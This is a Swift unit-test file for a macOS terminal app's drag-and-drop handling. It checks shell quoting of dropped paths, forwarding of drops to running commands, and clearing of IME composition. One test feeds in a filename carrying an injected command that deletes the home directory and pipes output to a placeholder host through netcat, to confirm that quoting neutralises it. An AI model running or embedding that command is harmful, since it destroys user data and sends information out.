import XCTest
import AppKit
@testable import Blackbird

final class DragDropTests: XCTestCase {
    /// `shellQuote` wraps a path in single quotes and escapes embedded singles.
    func testShellQuoteSimple() {
        XCTAssertEqual(TerminalView.shellQuote("/Users/foo/bar.png"),
                       "'/Users/foo/bar.png'")
    }

    func testShellQuoteWithSpaces() {
        XCTAssertEqual(TerminalView.shellQuote("/Users/foo/my image.png"),
                       "'/Users/foo/my image.png'")
    }

    func testShellQuoteWithEmbeddedSingleQuote() {
        // Classic POSIX recipe: close quote, escaped single, reopen.
        XCTAssertEqual(TerminalView.shellQuote("/tmp/don't.txt"),
                       "'/tmp/don'\\''t.txt'")
    }

    func testJoinedMultiFile() {
        let joined = TerminalView.joinedDroppedPaths([
            "/a/one.png",
            "/b/two three.png",
        ])
        XCTAssertEqual(joined, "'/a/one.png' '/b/two three.png'")
    }

    func testShellQuoteRejectsShellMetachars() {
        // Filenames can technically contain backticks, dollar signs,
        // semicolons, pipes. Single-quote wrapping neutralises all of
        // them — test verifies the quoter doesn't collapse anything.
        let name = "$(rm -rf ~) ; echo `whoami` | nc evil 1234"
        let quoted = TerminalView.shellQuote(name)
        // Metachars pass through literally; the outer single quotes
        // turn them into plain characters for the shell.
        XCTAssertTrue(quoted.hasPrefix("'"))
        XCTAssertTrue(quoted.hasSuffix("'"))
        XCTAssertTrue(quoted.contains("$(rm -rf ~)"))
    }

    func testShellQuote_emptyString() {
        // An empty-string path (edge-case from misbehaving
        // NSPasteboard reader) becomes just `''` — harmless when
        // pasted into the shell as a positional arg.
        XCTAssertEqual(TerminalView.shellQuote(""), "''")
    }

    func testJoinedDroppedPaths_emptyArray() {
        XCTAssertEqual(TerminalView.joinedDroppedPaths([]), "")
    }

    func testJoinedDroppedPaths_singleFile() {
        XCTAssertEqual(
            TerminalView.joinedDroppedPaths(["/only/one.txt"]),
            "'/only/one.txt'"
        )
    }

    // MARK: - Drop integration regressions
    //
    // Bug #19 / #20 / #21 cover the `performDragOperation` glue, not the
    // pure `shellQuote` / `joinedDroppedPaths` formatters above. The view
    // exposes `performDropOfPaths` as a test seam (NSDraggingInfo isn't
    // mockable: AppKit treats it specially and synthesised conformers
    // crash on the framework's internal `_concreteDraggingInfo` lookup),
    // and `pasteTextRecorderForTests` captures the pre-encoding string
    // the paste pipeline saw so we can assert quoting end-to-end.

    /// Regression: a drop while the shell has an active foreground
    /// child (claude, python, psql, vim, …) must be forwarded to that
    /// child, not refused. An earlier revision (Bug #19) gated drops on
    /// `hasForegroundChild()` and broke every interactive REPL — most
    /// painfully Claude Code, where dragging in an image path is a
    /// primary workflow. Terminal.app and iTerm2 both forward; we do
    /// too.
    func test_drop_duringForegroundCommand_accepted() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        session._testForegroundChildOverride = true
        view.session = session
        var pastes: [String] = []
        view.pasteTextRecorderForTests = { pastes.append($0) }

        let accepted = view.performDropOfPaths(["/tmp/example.txt"])

        XCTAssertTrue(accepted, "drop must be forwarded to the running command")
        XCTAssertEqual(pastes, ["'/tmp/example.txt'"],
                       "the quoted path should reach the paste pipeline regardless of foreground child state")
    }

    /// Baseline: with no foreground child, the drop is accepted by the
    /// shell. Pairs with the regression above — verifies behaviour is
    /// identical whether or not a child is running.
    func test_drop_withoutForegroundCommand_accepted() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        session._testForegroundChildOverride = false
        view.session = session
        var pastes: [String] = []
        view.pasteTextRecorderForTests = { pastes.append($0) }

        let accepted = view.performDropOfPaths(["/tmp/example.txt"])

        XCTAssertTrue(accepted)
        XCTAssertEqual(pastes, ["'/tmp/example.txt'"])
    }

    /// Bug #20: paths with shell metacharacters (spaces, $, backticks,
    /// quotes) must be single-quote-wrapped before reaching the shell.
    /// This is the integration check on top of `testShellQuoteWithSpaces`
    /// — verifies the wrapping happens through the drop entry point too,
    /// not just in the pure helper.
    func test_drop_quotesPathWithSpaces() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        view.session = session
        var pastes: [String] = []
        view.pasteTextRecorderForTests = { pastes.append($0) }

        view.performDropOfPaths(["/tmp/has spaces.txt"])

        XCTAssertEqual(pastes, ["'/tmp/has spaces.txt'"])
    }

    /// Bug #20 hardening: a path containing a single quote round-trips
    /// through the POSIX `'\''` recipe so the shell parses it as one
    /// argument, not two.
    func test_drop_quotesPathWithEmbeddedSingleQuote() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        view.session = session
        var pastes: [String] = []
        view.pasteTextRecorderForTests = { pastes.append($0) }

        view.performDropOfPaths(["/tmp/don't.txt"])

        XCTAssertEqual(pastes, ["'/tmp/don'\\''t.txt'"])
    }

    /// Bug #21: a drop must clear any in-flight IME composition before
    /// the path bytes leave for the PTY. Otherwise the preedit overlay
    /// hangs over the freshly-pasted text and the next IME keystroke
    /// commits the stale composition on top of the path.
    func test_drop_cancelsActiveIMEComposition() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        view.session = session
        // Install a preedit composition the way a real IME would —
        // setMarkedText is the sanctioned entry point and sets up
        // `view.composition` plus the overlay subview.
        view.setMarkedText("か",
                           selectedRange: NSRange(location: 1, length: 0),
                           replacementRange: NSRange(location: NSNotFound, length: 0))
        XCTAssertTrue(view.hasMarkedText(), "precondition: composition is active")

        view.performDropOfPaths(["/tmp/file.txt"])

        XCTAssertFalse(view.hasMarkedText(),
                       "drop must clear the IME preedit before pasting bytes")
    }
}
